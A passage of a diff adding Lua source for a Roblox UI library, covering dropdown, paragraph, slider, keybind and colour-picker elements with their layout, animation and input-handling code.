+					Element:Destroy()
+				end
+			end
+
+			local Count = 0
+
+			for Idx, Value in next, Values do
+				local Table = {}
+
+				Count = Count + 1
+
+				local ButtonSelector = New("Frame", {
+					Size = UDim2.fromOffset(4, 14),
+					BackgroundColor3 = Color3.fromRGB(76, 194, 255),
+					Position = UDim2.fromOffset(-1, 16),
+					AnchorPoint = Vector2.new(0, 0.5),
+					ThemeTag = {
+						BackgroundColor3 = "Accent",
+					},
+				}, {
+					New("UICorner", {
+						CornerRadius = UDim.new(0, 2),
+					}),
+				})
+
+				local ButtonLabel = New("TextLabel", {
+					FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json"),
+					Text = Value,
+					TextColor3 = Color3.fromRGB(200, 200, 200),
+					TextSize = 13,
+					TextXAlignment = Enum.TextXAlignment.Left,
+					BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+					AutomaticSize = Enum.AutomaticSize.Y,
+					BackgroundTransparency = 1,
+					Size = UDim2.fromScale(1, 1),
+					Position = UDim2.fromOffset(10, 0),
+					Name = "ButtonLabel",
+					ThemeTag = {
+						TextColor3 = "Text",
+					},
+				})
+
+				local Button = New("TextButton", {
+					Size = UDim2.new(1, -5, 0, 32),
+					BackgroundTransparency = 1,
+					ZIndex = 23,
+					Text = "",
+					Parent = DropdownScrollFrame,
+					ThemeTag = {
+						BackgroundColor3 = "DropdownOption",
+					},
+				}, {
+					ButtonSelector,
+					ButtonLabel,
+					New("UICorner", {
+						CornerRadius = UDim.new(0, 6),
+					}),
+				})
+
+				local Selected
+
+				if Config.Multi then
+					Selected = Dropdown.Value[Value]
+				else
+					Selected = Dropdown.Value == Value
+				end
+
+				local BackMotor, SetBackTransparency = Creator.SpringMotor(1, Button, "BackgroundTransparency")
+				local SelMotor, SetSelTransparency = Creator.SpringMotor(1, ButtonSelector, "BackgroundTransparency")
+				local SelectorSizeMotor = Flipper.SingleMotor.new(6)
+
+				SelectorSizeMotor:onStep(function(value)
+					ButtonSelector.Size = UDim2.new(0, 4, 0, value)
+				end)
+
+				Creator.AddSignal(Button.MouseEnter, function()
+					SetBackTransparency(Selected and 0.85 or 0.89)
+				end)
+				Creator.AddSignal(Button.MouseLeave, function()
+					SetBackTransparency(Selected and 0.89 or 1)
+				end)
+				Creator.AddSignal(Button.MouseButton1Down, function()
+					SetBackTransparency(0.92)
+				end)
+				Creator.AddSignal(Button.MouseButton1Up, function()
+					SetBackTransparency(Selected and 0.85 or 0.89)
+				end)
+
+				function Table:UpdateButton()
+					if Config.Multi then
+						Selected = Dropdown.Value[Value]
+						if Selected then
+							SetBackTransparency(0.89)
+						end
+					else
+						Selected = Dropdown.Value == Value
+						SetBackTransparency(Selected and 0.89 or 1)
+					end
+
+					SelectorSizeMotor:setGoal(Flipper.Spring.new(Selected and 14 or 6, { frequency = 6 }))
+					SetSelTransparency(Selected and 0 or 1)
+				end
+				AddSignal(Button.Activated, function()
+					local Try = not Selected
+
+					if Dropdown:GetActiveValues() == 1 and not Try and not Config.AllowNull then
+					else
+						if Config.Multi then
+							Selected = Try
+							Dropdown.Value[Value] = Selected and true or nil
+						else
+							Selected = Try
+							Dropdown.Value = Selected and Value or nil
+
+							for _, OtherButton in next, Buttons do
+								OtherButton:UpdateButton()
+							end
+						end
+
+						Table:UpdateButton()
+
+						Dropdown:Display()
+
+						Library:SafeCallback(Dropdown.Callback, Dropdown.Value)
+						Library:SafeCallback(Dropdown.Changed, Dropdown.Value)
+					end
+				end)
+
+				Table:UpdateButton()
+				Dropdown:Display()
+
+				Buttons[Button] = Table
+			end
+
+			ListSizeX = 0
+			for Button, Table in next, Buttons do
+				if Button.ButtonLabel then
+					if Button.ButtonLabel.TextBounds.X > ListSizeX then
+						ListSizeX = Button.ButtonLabel.TextBounds.X
+					end
+				end
+			end
+			ListSizeX = ListSizeX + 30
+
+			RecalculateCanvasSize()
+			RecalculateListSize()
+		end
+
+		function Dropdown:SetValues(NewValues)
+			if NewValues then
+				Dropdown.Values = NewValues
+			end
+
+			Dropdown:BuildDropdownList()
+		end
+
+		function Dropdown:OnChanged(Func)
+			Dropdown.Changed = Func
+			Func(Dropdown.Value)
+		end
+
+		function Dropdown:SetValue(Val)
+			if Dropdown.Multi then
+				local nTable = {}
+
+				for Value, Bool in next, Val do
+					if table.find(Dropdown.Values, Value) then
+						nTable[Value] = true
+					end
+				end
+
+				Dropdown.Value = nTable
+			else
+				if not Val then
+					Dropdown.Value = nil
+				elseif table.find(Dropdown.Values, Val) then
+					Dropdown.Value = Val
+				end
+			end
+
+			Dropdown:BuildDropdownList()
+
+			Library:SafeCallback(Dropdown.Callback, Dropdown.Value)
+			Library:SafeCallback(Dropdown.Changed, Dropdown.Value)
+		end
+
+		function Dropdown:Destroy()
+			DropdownFrame:Destroy()
+			Library.Options[Idx] = nil
+		end
+
+		Dropdown:BuildDropdownList()
+		Dropdown:Display()
+
+		local Defaults = {}
+
+		if type(Config.Default) == "string" then
+			local Idx = table.find(Dropdown.Values, Config.Default)
+			if Idx then
+				table.insert(Defaults, Idx)
+			end
+		elseif type(Config.Default) == "table" then
+			for _, Value in next, Config.Default do
+				local Idx = table.find(Dropdown.Values, Value)
+				if Idx then
+					table.insert(Defaults, Idx)
+				end
+			end
+		elseif type(Config.Default) == "number" and Dropdown.Values[Config.Default] ~= nil then
+			table.insert(Defaults, Config.Default)
+		end
+
+		if next(Defaults) then
+			for i = 1, #Defaults do
+				local Index = Defaults[i]
+				if Config.Multi then
+					Dropdown.Value[Dropdown.Values[Index]] = true
+				else
+					Dropdown.Value = Dropdown.Values[Index]
+				end
+
+				if not Config.Multi then
+					break
+				end
+			end
+
+			Dropdown:BuildDropdownList()
+			Dropdown:Display()
+		end
+
+		Library.Options[Idx] = Dropdown
+		return Dropdown
+	end
+
+	return Element
+end)()
+ElementsTable.Paragraph = (function()
+	local Paragraph = {}
+	Paragraph.__index = Paragraph
+	Paragraph.__type = "Paragraph"
+
+	function Paragraph:New(Config)
+		Config.Content = Config.Content or ""
+
+		local Paragraph = Components.Element(Config.Title, Config.Content, Paragraph.Container, false, Config)
+		Paragraph.Frame.BackgroundTransparency = 0.92
+		Paragraph.Border.Transparency = 0.6
+
+		Paragraph.SetTitle = Paragraph.SetTitle
+		Paragraph.SetDesc = Paragraph.SetDesc
+		Paragraph.Visible = Paragraph.Visible
+		Paragraph.Elements = Paragraph
+
+		return Paragraph
+	end
+
+	return Paragraph
+end)()
+ElementsTable.Slider = (function()
+	local Element = {}
+	Element.__index = Element
+	Element.__type = "Slider"
+
+	function Element:New(Idx, Config)
+		assert(Config.Title, "Slider - Missing Title.")
+		assert(Config.Default, "Slider - Missing default value.")
+		assert(Config.Min, "Slider - Missing minimum value.")
+		assert(Config.Max, "Slider - Missing maximum value.")
+		assert(Config.Rounding, "Slider - Missing rounding value.")
+
+		local Slider = {
+			Value = nil,
+			Min = Config.Min,
+			Max = Config.Max,
+			Rounding = Config.Rounding,
+			Callback = Config.Callback or function(Value) end,
+			Type = "Slider",
+		}
+
+		local Dragging = false
+
+		local SliderFrame = Components.Element(Config.Title, Config.Description, self.Container, false, Config)
+		SliderFrame.DescLabel.Size = UDim2.new(1, -170, 0, 14)
+
+		Slider.Elements = SliderFrame
+		Slider.SetTitle = SliderFrame.SetTitle
+		Slider.SetDesc = SliderFrame.SetDesc
+		Slider.Visible = SliderFrame.Visible
+
+		local SliderDot = New("ImageLabel", {
+			AnchorPoint = Vector2.new(0, 0.5),
+			Position = UDim2.new(0, -7, 0.5, 0),
+			Size = UDim2.fromOffset(14, 14),
+			Image = "http://www.roblox.com/asset/?id=12266946128",
+			ThemeTag = {
+				ImageColor3 = "Accent",
+			},
+		})
+
+		local SliderRail = New("Frame", {
+			BackgroundTransparency = 1,
+			Position = UDim2.fromOffset(7, 0),
+			Size = UDim2.new(1, -14, 1, 0),
+		}, {
+			SliderDot,
+		})
+
+		local SliderFill = New("Frame", {
+			Size = UDim2.new(0, 0, 1, 0),
+			ThemeTag = {
+				BackgroundColor3 = "Accent",
+			},
+		}, {
+			New("UICorner", {
+				CornerRadius = UDim.new(1, 0),
+			}),
+		})
+
+		local SliderDisplay = New("TextLabel", {
+			FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json"),
+			Text = "Value",
+			TextSize = 12,
+			TextWrapped = true,
+			TextXAlignment = Enum.TextXAlignment.Right,
+			BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+			BackgroundTransparency = 1,
+			Size = UDim2.new(0, 100, 0, 14),
+			Position = UDim2.new(0, -4, 0.5, 0),
+			AnchorPoint = Vector2.new(1, 0.5),
+			ThemeTag = {
+				TextColor3 = "SubText",
+			},
+		})
+
+		local SliderInput = New("TextBox", {
+			FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json"),
+			Text = "",
+			TextSize = 12,
+			TextXAlignment = Enum.TextXAlignment.Right,
+			BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+			BackgroundTransparency = 0.8,
+			Size = UDim2.new(0, 0, 0, 14),
+			Position = UDim2.new(0, -4, 0.5, 0),
+			AnchorPoint = Vector2.new(1, 0.5),
+			PlaceholderText = "Value",
+			ClearTextOnFocus = false,
+			Visible = true,
+			TextWrapped = false,
+			TextTransparency = 1,
+			BackgroundTransparency = 1,
+			ThemeTag = {
+				TextColor3 = "SubText",
+				BackgroundColor3 = "Element",
+			},
+		}, {
+			New("UICorner", {
+				CornerRadius = UDim.new(0, 3),
+			}),
+			New("UIStroke", {
+				ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+				Color = Color3.fromRGB(0, 0, 0),
+				Transparency = 1,
+				Thickness = 1,
+			}),
+		})
+
+		local SliderInner = New("Frame", {
+			Size = UDim2.new(1, 0, 0, 4),
+			AnchorPoint = Vector2.new(1, 0.5),
+			Position = UDim2.new(1, -10, 0.5, 0),
+			BackgroundTransparency = 0.4,
+			Parent = SliderFrame.Frame,
+			ThemeTag = {
+				BackgroundColor3 = "SliderRail",
+			},
+		}, {
+			New("UICorner", {
+				CornerRadius = UDim.new(1, 0),
+			}),
+			New("UISizeConstraint", {
+				MaxSize = Vector2.new(150, math.huge),
+			}),
+			SliderDisplay,
+			SliderInput,
+			SliderFill,
+			SliderRail,
+		})
+
+		local isHovering = false
+		local inputVisible = false
+
+		local function calculateInputWidth(text)
+			local textSize = game:GetService("TextService"):GetTextSize(
+				text or "0",
+				12,
+				Enum.Font.SourceSans,
+				Vector2.new(1000, 14)
+			)
+			local padding = 8
+			local minWidth = 25
+			local maxWidth = 80
+			return math.max(minWidth, math.min(maxWidth, textSize.X + padding))
+		end
+
+		Creator.AddSignal(SliderFrame.Frame.MouseEnter, function()
+			isHovering = true
+			if not SliderInput:IsFocused() then
+				SliderDisplay.Visible = false
+				SliderInput.Text = tostring(Slider.Value)
+				
+				local targetWidth = calculateInputWidth(tostring(Slider.Value))
+				SliderInput.Size = UDim2.new(0, targetWidth, 0, 14)
+				inputVisible = true
+				
+				local tweenInfo = TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
+				
+				TweenService:Create(SliderInput, tweenInfo, {
+					TextTransparency = 0,
+					BackgroundTransparency = 0.8
+				}):Play()
+				
+				TweenService:Create(SliderInput.UIStroke, tweenInfo, {
+					Transparency = 0.7
+				}):Play()
+			end
+		end)
+
+		Creator.AddSignal(SliderFrame.Frame.MouseLeave, function()
+			isHovering = false
+			if not SliderInput:IsFocused() and inputVisible then
+				local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In)
+				
+				TweenService:Create(SliderInput, tweenInfo, {
+					TextTransparency = 1,
+					BackgroundTransparency = 1
+				}):Play()
+				
+				TweenService:Create(SliderInput.UIStroke, tweenInfo, {
+					Transparency = 1
+				}):Play()
+				
+				task.wait(0.2)
+				SliderDisplay.Visible = true
+				inputVisible = false
+			end
+		end)
+
+		Creator.AddSignal(SliderInput.Changed, function(property)
+			if property == "Text" then
+				local text = SliderInput.Text
+				local cleanText = text:gsub("[^%d%.%-]", "")
+				if cleanText:find("%-") and cleanText:find("%-") ~= 1 then
+					cleanText = cleanText:gsub("%-", "")
+				end
+				local dotCount = 0
+				cleanText = cleanText:gsub("%.", function()
+					dotCount = dotCount + 1
+					return dotCount == 1 and "." or ""
+				end)
+				
+				if cleanText ~= text then
+					SliderInput.Text = cleanText
+				end
+				
+				if SliderInput.Visible then
+					local targetWidth = calculateInputWidth(cleanText)
+					SliderInput.Size = UDim2.new(0, targetWidth, 0, 14)
+				end
+			end
+		end)
+
+		Creator.AddSignal(SliderInput.FocusLost, function(enterPressed)
+			local inputValue = tonumber(SliderInput.Text)
+			if inputValue then
+				Slider:SetValue(inputValue)
+			else
+				SliderInput.Text = tostring(Slider.Value)
+			end
+			
+			if not isHovering then
+				local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In)
+				
+				TweenService:Create(SliderInput, tweenInfo, {
+					TextTransparency = 1,
+					BackgroundTransparency = 1
+				}):Play()
+				
+				TweenService:Create(SliderInput.UIStroke, tweenInfo, {
+					Transparency = 1
+				}):Play()
+				
+				task.wait(0.2)
+				SliderDisplay.Visible = true
+				inputVisible = false
+			end
+		end)
+
+		Creator.AddSignal(SliderInput.Focused, function()
+			SliderInput.Text = tostring(Slider.Value)
+		end)
+
+		Creator.AddSignal(SliderInput.InputBegan, function(Input)
+			if Input.UserInputType == Enum.UserInputType.MouseButton1 then
+				Dragging = false
+			end
+		end)
+
+		Creator.AddSignal(SliderDot.InputBegan, function(Input)
+			if
+				Input.UserInputType == Enum.UserInputType.MouseButton1
+				or Input.UserInputType == Enum.UserInputType.Touch
+			then
+				Dragging = true
+			end
+		end)
+
+		Creator.AddSignal(SliderDot.InputEnded, function(Input)
+			if
+				Input.UserInputType == Enum.UserInputType.MouseButton1
+				or Input.UserInputType == Enum.UserInputType.Touch
+			then
+				Dragging = false
+			end
+		end)
+
+		Creator.AddSignal(UserInputService.InputChanged, function(Input)
+			if Dragging then
+				local position = nil
+				if Input.UserInputType == Enum.UserInputType.MouseMovement then
+					position = Input.Position
+				elseif Input.UserInputType == Enum.UserInputType.Touch then
+					position = Input.Position
+				end
+
+				if position then
+					local SizeScale = math.clamp((position.X - SliderRail.AbsolutePosition.X) / SliderRail.AbsoluteSize.X, 0, 1)
+					Slider:SetValue(Slider.Min + ((Slider.Max - Slider.Min) * SizeScale))
+				end
+			end
+		end)
+
+		Creator.AddSignal(SliderRail.InputBegan, function(Input)
+			if Input.UserInputType == Enum.UserInputType.Touch then
+				Dragging = true
+				local SizeScale = math.clamp((Input.Position.X - SliderRail.AbsolutePosition.X) / SliderRail.AbsoluteSize.X, 0, 1)
+				Slider:SetValue(Slider.Min + ((Slider.Max - Slider.Min) * SizeScale))
+			end
+		end)
+
+		Creator.AddSignal(SliderRail.InputEnded, function(Input)
+			if Input.UserInputType == Enum.UserInputType.Touch then
+				Dragging = false
+			end
+		end)
+
+		function Slider:OnChanged(Func)
+			Slider.Changed = Func
+			Func(Slider.Value)
+		end
+
+		function Slider:SetValue(Value)
+			self.Value = Library:Round(math.clamp(Value, Slider.Min, Slider.Max), Slider.Rounding)
+			SliderDot.Position = UDim2.new((self.Value - Slider.Min) / (Slider.Max - Slider.Min), -7, 0.5, 0)
+			SliderFill.Size = UDim2.fromScale((self.Value - Slider.Min) / (Slider.Max - Slider.Min), 1)
+			SliderDisplay.Text = tostring(self.Value)
+			
+			if SliderInput.Visible then
+				SliderInput.Text = tostring(self.Value)
+				local targetWidth = calculateInputWidth(tostring(self.Value))
+				SliderInput.Size = UDim2.new(0, targetWidth, 0, 14)
+			end
+
+			Library:SafeCallback(Slider.Callback, self.Value)
+			Library:SafeCallback(Slider.Changed, self.Value)
+		end
+
+		function Slider:Destroy()
+			SliderFrame:Destroy()
+			Library.Options[Idx] = nil
+		end
+
+		Slider:SetValue(Config.Default)
+
+		Library.Options[Idx] = Slider
+		return Slider
+	end
+
+	return Element
+end)()
+ElementsTable.Keybind = (function()
+	local Element = {}
+	Element.__index = Element
+	Element.__type = "Keybind"
+
+	function Element:New(Idx, Config)
+		assert(Config.Title, "KeyBind - Missing Title")
+		assert(Config.Default, "KeyBind - Missing default value.")
+
+		local Keybind = {
+			Value = Config.Default,
+			Toggled = false,
+			Mode = Config.Mode or "Toggle",
+			Type = "Keybind",
+			Callback = Config.Callback or function(Value) end,
+			ChangedCallback = Config.ChangedCallback or function(New) end,
+		}
+
+		local Picking = false
+
+		local KeybindFrame = Components.Element(Config.Title, Config.Description, self.Container, true)
+
+		Keybind.SetTitle = KeybindFrame.SetTitle
+		Keybind.SetDesc = KeybindFrame.SetDesc
+		Keybind.Visible = KeybindFrame.Visible
+		Keybind.Elements = KeybindFrame
+
+		local KeybindDisplayLabel = New("TextLabel", {
+			FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal),
+			Text = Config.Default,
+			TextColor3 = Color3.fromRGB(240, 240, 240),
+			TextSize = 13,
+			TextXAlignment = Enum.TextXAlignment.Center,
+			Size = UDim2.new(0, 0, 0, 14),
+			Position = UDim2.new(0, 0, 0.5, 0),
+			AnchorPoint = Vector2.new(0, 0.5),
+			BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+			AutomaticSize = Enum.AutomaticSize.X,
+			BackgroundTransparency = 1,
+			ThemeTag = {
+				TextColor3 = "Text",
+			},
+		})
+
+		local KeybindDisplayFrame = New("TextButton", {
+			Size = UDim2.fromOffset(0, 30),
+			Position = UDim2.new(1, -10, 0.5, 0),
+			AnchorPoint = Vector2.new(1, 0.5),
+			BackgroundTransparency = 0.9,
+			Parent = KeybindFrame.Frame,
+			AutomaticSize = Enum.AutomaticSize.X,
+			ThemeTag = {
+				BackgroundColor3 = "Keybind",
+			},
+		}, {
+			New("UICorner", {
+				CornerRadius = UDim.new(0, 5),
+			}),
+			New("UIPadding", {
+				PaddingLeft = UDim.new(0, 8),
+				PaddingRight = UDim.new(0, 8),
+			}),
+			New("UIStroke", {
+				Transparency = 0.5,
+				ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+				ThemeTag = {
+					Color = "InElementBorder",
+				},
+			}),
+			KeybindDisplayLabel,
+		})
+
+		function Keybind:GetState()
+			if UserInputService:GetFocusedTextBox() and Keybind.Mode ~= "Always" then
+				return false
+			end
+
+			if Keybind.Mode == "Always" then
+				return true
+			elseif Keybind.Mode == "Hold" then
+				if Keybind.Value == "None" then
+					return false
+				end
+
+				local Key = Keybind.Value
+
+				if Key == "MouseLeft" or Key == "MouseRight" then
+					return Key == "MouseLeft" and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1)
+						or Key == "MouseRight"
+						and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2)
+				else
+					return UserInputService:IsKeyDown(Enum.KeyCode[Keybind.Value])
+				end
+			else
+				return Keybind.Toggled
+			end
+		end
+
+		function Keybind:SetValue(Key, Mode)
+			Key = Key or Keybind.Key
+			Mode = Mode or Keybind.Mode
+
+			KeybindDisplayLabel.Text = Key
+			Keybind.Value = Key
+			Keybind.Mode = Mode
+		end
+
+		function Keybind:OnClick(Callback)
+			Keybind.Clicked = Callback
+		end
+
+		function Keybind:OnChanged(Callback)
+			Keybind.Changed = Callback
+			Callback(Keybind.Value)
+		end
+
+		function Keybind:DoClick()
+			Library:SafeCallback(Keybind.Callback, Keybind.Toggled)
+			Library:SafeCallback(Keybind.Clicked, Keybind.Toggled)
+		end
+
+		function Keybind:Destroy()
+			KeybindFrame:Destroy()
+			Library.Options[Idx] = nil
+		end
+
+		Creator.AddSignal(KeybindDisplayFrame.InputBegan, function(Input)
+			if
+				Input.UserInputType == Enum.UserInputType.MouseButton1
+				or Input.UserInputType == Enum.UserInputType.Touch
+			then
+				Picking = true
+				KeybindDisplayLabel.Text = "..."
+
+				wait(0.2)
+
+				local Event
+				Event = UserInputService.InputBegan:Connect(function(Input)
+					local Key
+
+					if Input.UserInputType == Enum.UserInputType.Keyboard then
+						Key = Input.KeyCode.Name
+					elseif Input.UserInputType == Enum.UserInputType.MouseButton1 then
+						Key = "MouseLeft"
+					elseif Input.UserInputType == Enum.UserInputType.MouseButton2 then
+						Key = "MouseRight"
+					end
+
+					local EndedEvent
+					EndedEvent = UserInputService.InputEnded:Connect(function(Input)
+						if
+							Input.KeyCode.Name == Key
+							or Key == "MouseLeft" and Input.UserInputType == Enum.UserInputType.MouseButton1
+							or Key == "MouseRight" and Input.UserInputType == Enum.UserInputType.MouseButton2
+						then
+							Picking = false
+
+							KeybindDisplayLabel.Text = Key
+							Keybind.Value = Key
+
+							Library:SafeCallback(Keybind.ChangedCallback, Input.KeyCode or Input.UserInputType)
+							Library:SafeCallback(Keybind.Changed, Input.KeyCode or Input.UserInputType)
+
+							Event:Disconnect()
+							EndedEvent:Disconnect()
+						end
+					end)
+				end)
+			end
+		end)
+
+		Creator.AddSignal(UserInputService.InputBegan, function(Input)
+			if not Picking and not UserInputService:GetFocusedTextBox() then
+				if Keybind.Mode == "Toggle" then
+					local Key = Keybind.Value
+
+					if Key == "MouseLeft" or Key == "MouseRight" then
+						if
+							Key == "MouseLeft" and Input.UserInputType == Enum.UserInputType.MouseButton1
+							or Key == "MouseRight" and Input.UserInputType == Enum.UserInputType.MouseButton2
+						then
+							Keybind.Toggled = not Keybind.Toggled
+							Keybind:DoClick()
+						end
+					elseif Input.UserInputType == Enum.UserInputType.Keyboard then
+						if Input.KeyCode.Name == Key then
+							Keybind.Toggled = not Keybind.Toggled
+							Keybind:DoClick()
+						end
+					end
+				end
+			end
+		end)
+
+		Library.Options[Idx] = Keybind
+		return Keybind
+	end
+
+	return Element
+end)()
+ElementsTable.Colorpicker = (function()
+	local Element = {}
+	Element.__index = Element
+	Element.__type = "Colorpicker"
+
+	function Element:New(Idx, Config)
+		assert(Config.Title, "Colorpicker - Missing Title")
+		assert(Config.Default, "AddColorPicker: Missing default value.")
+
+		local Colorpicker = {
+			Value = Config.Default,
+			Transparency = Config.Transparency or 0,
+			Type = "Colorpicker",
+			Title = type(Config.Title) == "string" and Config.Title or "Colorpicker",
+			Callback = Config.Callback or function(Color) end,
+		}
+
+		function Colorpicker:SetHSVFromRGB(Color)
+			local H, S, V = Color3.toHSV(Color)
+			Colorpicker.Hue = H
+			Colorpicker.Sat = S
+			Colorpicker.Vib = V
+		end
+
+		Colorpicker:SetHSVFromRGB(Colorpicker.Value)
+
+		local ColorpickerFrame = Components.Element(Config.Title, Config.Description, self.Container, true)
+
+		Colorpicker.SetTitle = ColorpickerFrame.SetTitle
+		Colorpicker.SetDesc = ColorpickerFrame.SetDesc
+		Colorpicker.Visible = ColorpickerFrame.Visible
+		Colorpicker.Elements = ColorpickerFrame
+
+		local DisplayFrameColor = New("Frame", {
+			Size = UDim2.fromScale(1, 1),
+			BackgroundColor3 = Colorpicker.Value,
+			Parent = ColorpickerFrame.Frame,
+		}, {
+			New("UICorner", {
+				CornerRadius = UDim.new(0, 4),
+			}),
+		})
+
+		local DisplayFrame = New("ImageLabel", {
+			Size = UDim2.fromOffset(26, 26),
+			Position = UDim2.new(1, -10, 0.5, 0),
+			AnchorPoint = Vector2.new(1, 0.5),
+			Parent = ColorpickerFrame.Frame,
+			Image = "http://www.roblox.com/asset/?id=14204231522",
+			ImageTransparency = 0.45,
+			ScaleType = Enum.ScaleType.Tile,
+			TileSize = UDim2.fromOffset(40, 40),
+		}, {
+			New("UICorner", {
+				CornerRadius = UDim.new(0, 4),
+			}),
+			DisplayFrameColor,
+		})
+
+		local function CreateColorDialog()
+			local Dialog = Components.Dialog:Create()
+			Dialog.Title.Text = Colorpicker.Title
+			Dialog.Root.Size = UDim2.fromOffset(430, 330)
+
+			local Hue, Sat, Vib = Colorpicker.Hue, Colorpicker.Sat, Colorpicker.Vib
+			local Transparency = Colorpicker.Transparency
+
+			local function CreateInput()
+				local Box = Components.Textbox()
+				Box.Frame.Parent = Dialog.Root
+				Box.Frame.Size = UDim2.new(0, 90, 0, 32)
+
+				return Box
+			end
+
+			local function CreateInputLabel(Text, Pos)
+				return New("TextLabel", {
+					FontFace = Font.new(
+						"rbxasset://fonts/families/GothamSSm.json",
+						Enum.FontWeight.Medium,
+						Enum.FontStyle.Normal
+					),
+					Text = Text,
+					TextColor3 = Color3.fromRGB(240, 240, 240),
+					TextSize = 13,
+					TextXAlignment = Enum.TextXAlignment.Left,
+					Size = UDim2.new(1, 0, 0, 32),
+					Position = Pos,
+					BackgroundTransparency = 1,
+					Parent = Dialog.Root,
+					ThemeTag = {
+						TextColor3 = "Text",
+					},
+				})
+			end
+
+			local function GetRGB()
+				local Value = Color3.fromHSV(Hue, Sat, Vib)
+				return { R = math.floor(Value.r * 255), G = math.floor(Value.g * 255), B = math.floor(Value.b * 255) }
+			end
+
+			local SatCursor = New("ImageLabel", {
+				Size = UDim2.new(0, 18, 0, 18),
+				ScaleType = Enum.ScaleType.Fit,
+				AnchorPoint = Vector2.new(0.5, 0.5),
+				BackgroundTransparency = 1,
+				Image = "http://www.roblox.com/asset/?id=4805639000",
+			})
+
+			local SatVibMap = New("ImageLabel", {
+				Size = UDim2.fromOffset(180, 160),
+				Position = UDim2.fromOffset(20, 55),
+				Image = "rbxassetid://4155801252",
+				BackgroundColor3 = Colorpicker.Value,
+				BackgroundTransparency = 0,
+				Parent = Dialog.Root,
+			}, {
+				New("UICorner", {
+					CornerRadius = UDim.new(0, 4),
+				}),
+				SatCursor,
+			})
+
+			local OldColorFrame = New("Frame", {
+				BackgroundColor3 = Colorpicker.Value,
+				Size = UDim2.fromScale(1, 1),
+				BackgroundTransparency = Colorpicker.Transparency,
+			}, {
+				New("UICorner", {
+					CornerRadius = UDim.new(0, 4),
+				}),
+			})
+			local OldColorFrameChecker = New("ImageLabel", {
+				Image = "http://www.roblox.com/asset/?id=14204231522",
+				ImageTransparency = 0.45,
+				ScaleType = Enum.ScaleType.Tile,
+				TileSize = UDim2.fromOffset(40, 40),
+				BackgroundTransparency = 1,
+				Position = UDim2.fromOffset(112, 220),
+				Size = UDim2.fromOffset(88, 24),
+				Parent = Dialog.Root,
+			}, {
+				New("UICorner", {
+					CornerRadius = UDim.new(0, 4),
+				}),
+				New("UIStroke", {
+					Thickness = 2,
+					Transparency = 0.75,
+				}),
+				OldColorFrame,
+			})
+
+			local DialogDisplayFrame = New("Frame", {
+				BackgroundColor3 = Colorpicker.Value,
+				Size = UDim2.fromScale(1, 1),
+				BackgroundTransparency = 0,
+			}, {
+				New("UICorner", {
+					CornerRadius = UDim.new(0, 4),
+				}),
+			})
+
+			local DialogDisplayFrameChecker = New("ImageLabel", {
+				Image = "http://www.roblox.com/asset/?id=14204231522",
+				ImageTransparency = 0.45,
+				ScaleType = Enum.ScaleType.Tile,
+				TileSize = UDim2.fromOffset(40, 40),
+				BackgroundTransparency = 1,
+				Position = UDim2.fromOffset(20, 220),
+				Size = UDim2.fromOffset(88, 24),
+				Parent = Dialog.Root,
+			}, {
+				New("UICorner", {
+					CornerRadius = UDim.new(0, 4),
+				}),
+				New("UIStroke", {
+					Thickness = 2,
+					Transparency = 0.75,
+				}),
+				DialogDisplayFrame,
+			})
+
+			local SequenceTable = {}
+
+			for Color = 0, 1, 0.1 do
+				table.insert(SequenceTable, ColorSequenceKeypoint.new(Color, Color3.fromHSV(Color, 1, 1)))
+			end
+
+			local HueSliderGradient = New("UIGradient", {
+				Color = ColorSequence.new(SequenceTable),
+				Rotation = 90,
+			})
+
+			local HueDragHolder = New("Frame", {
+				Size = UDim2.new(1, 0, 1, -10),
+				Position = UDim2.fromOffset(0, 5),
+				BackgroundTransparency = 1,
+			})
+
+			local HueDrag = New("ImageLabel", {
+				Size = UDim2.fromOffset(14, 14),
+				Image = "http://www.roblox.com/asset/?id=12266946128",
+				Parent = HueDragHolder,
+				ThemeTag = {
+					ImageColor3 = "DialogInput",
+				},
+			})
+
+			local HueSlider = New("Frame", {
+				Size = UDim2.fromOffset(12, 190),
+				Position = UDim2.fromOffset(210, 55),
+				Parent = Dialog.Root,
+			}, {
+				New("UICorner", {
+					CornerRadius = UDim.new(1, 0),
+				}),
+				HueSliderGradient,
+				HueDragHolder,
+			})
+
+			local HexInput = CreateInput()
+			HexInput.Frame.Position = UDim2.fromOffset(Config.Transparency and 260 or 240, 55)
+			CreateInputLabel("Hex", UDim2.fromOffset(Config.Transparency and 360 or 340, 55))
+
+			local RedInput = CreateInput()
+			RedInput.Frame.Position = UDim2.fromOffset(Config.Transparency and 260 or 240, 95)
+			CreateInputLabel("Red", UDim2.fromOffset(Config.Transparency and 360 or 340, 95))
+
+			local GreenInput = CreateInput()
+			GreenInput.Frame.Position = UDim2.fromOffset(Config.Transparency and 260 or 240, 135)
+			CreateInputLabel("Green", UDim2.fromOffset(Config.Transparency and 360 or 340, 135))
+
+			local BlueInput = CreateInput()
+			BlueInput.Frame.Position = UDim2.fromOffset(Config.Transparency and 260 or 240, 175)
+			CreateInputLabel("Blue", UDim2.fromOffset(Config.Transparency and 360 or 340, 175))
+
+			local AlphaInput
+			if Config.Transparency then
+				AlphaInput = CreateInput()
+				AlphaInput.Frame.Position = UDim2.fromOffset(260, 215)
+				CreateInputLabel("Alpha", UDim2.fromOffset(360, 215))
+			end
+
+			local TransparencySlider, TransparencyDrag, TransparencyColor
+			if Config.Transparency then
+				local TransparencyDragHolder = New("Frame", {
+					Size = UDim2.new(1, 0, 1, -10),
+					Position = UDim2.fromOffset(0, 5),
+					BackgroundTransparency = 1,
+				})
+
+				TransparencyDrag = New("ImageLabel", {
+					Size = UDim2.fromOffset(14, 14),
+					Image = "http://www.roblox.com/asset/?id=12266946128",
